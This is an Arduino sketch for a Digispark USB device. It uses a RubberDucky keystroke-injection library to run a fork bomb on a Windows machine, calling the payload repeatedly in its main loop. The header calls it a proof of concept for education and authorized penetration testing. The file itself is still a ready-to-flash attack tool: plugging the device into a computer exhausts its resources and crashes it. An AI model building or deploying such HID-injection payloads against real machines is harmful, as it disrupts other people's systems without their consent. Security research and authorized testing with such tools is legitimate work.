/**
 * @file forkBomb.ino
 * @brief Example script using the RubberDucky library for Digispark to execute a fork bomb on Windows.
 *
 * This sketch initializes the RubberDucky interface and executes a fork bomb on a Windows machine.
 * It is intended for educational and authorized penetration testing purposes only.
 *
 * @note This code is a proof of concept and must not be used for malicious activities.
 *
 * @author AntonioBerna
 * @date 2025
 * @copyright GPL-3.0 License
 */

#include "RubberDucky.h"

RubberDucky ducky;

void setup() {
  ducky.init(); ///< Initialize USB HID and other required subsystems
}

void loop() {
  ducky.refreshUSBConnection(); ///< Re-initialize USB in case of dropped connection
  ducky.forkBomb(true); ///< Execute fork bomb payload on Windows
  ducky.ledFeedback(10000); ///< Provide LED feedback to indicate completion
}
